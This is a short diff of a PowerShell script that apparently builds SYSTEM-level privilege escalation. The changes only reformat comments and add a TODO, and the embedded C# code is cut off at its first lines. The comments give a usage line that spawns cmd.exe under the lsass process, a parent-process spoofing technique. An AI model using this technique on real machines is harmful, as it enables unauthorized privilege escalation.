@@ -6,12 +6,12 @@ get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
 
 #>
 
-#Simple powershell/C# to spawn a process under a different parent process
-#Launch PowerShell As Administrator
-#usage: . .\Get- System.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
-#Reference: https://github.com/decoder-it/psgetsystem
+# Simple powershell/C# to spawn a process under a different Token
+# Launch PowerShell As Administrator
+# usage: . .\Get- System.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
+# Reference: https://github.com/decoder-it/psgetsystem
 
-
+# TODO Make this more PowerShelly
 
 $code = @"
 using System;
